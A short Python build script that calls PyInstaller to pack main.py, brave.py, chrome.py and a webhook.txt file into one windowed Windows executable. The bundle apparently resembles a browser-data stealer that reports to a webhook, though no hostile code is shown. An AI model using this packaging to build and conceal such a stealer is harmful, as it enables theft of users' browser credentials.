import pathlib
import subprocess


subprocess.call("pyinstaller --noconfirm --onefile --windowed --add-data \"brave.py;.\" --add-data \"chrome.py;.\" --add-data \"webhook.txt;.\" --clean --hidden-import \"win32api\" \"main.py\"", shell=True)
